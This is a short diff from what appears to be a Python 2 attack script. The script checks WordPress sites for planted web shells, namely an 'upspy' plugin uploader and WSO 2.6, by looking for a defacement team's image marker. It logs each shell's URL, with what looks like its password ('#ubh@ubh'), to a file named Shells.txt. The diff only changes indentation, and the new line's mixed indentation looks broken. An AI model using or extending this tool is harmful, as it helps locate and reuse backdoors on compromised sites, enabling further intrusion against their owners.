@@ -113,7 +113,7 @@ def WordPress1(site):
 							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh | '+site+'/wp-content/plugins/upspy/sllolx.php\n')
 					else :		
 						with open('Shells.txt', mode='a') as d:
-							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh\n')
+		 				d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh\n')
 			elif 'http://www.ubhteam.org/images/UBHFinal1.png' in upspy :
 				print ' # '+site +'/ --> {}[UPspy]'.format(fg)
 				if 'WSO 2.6' in wsospy :
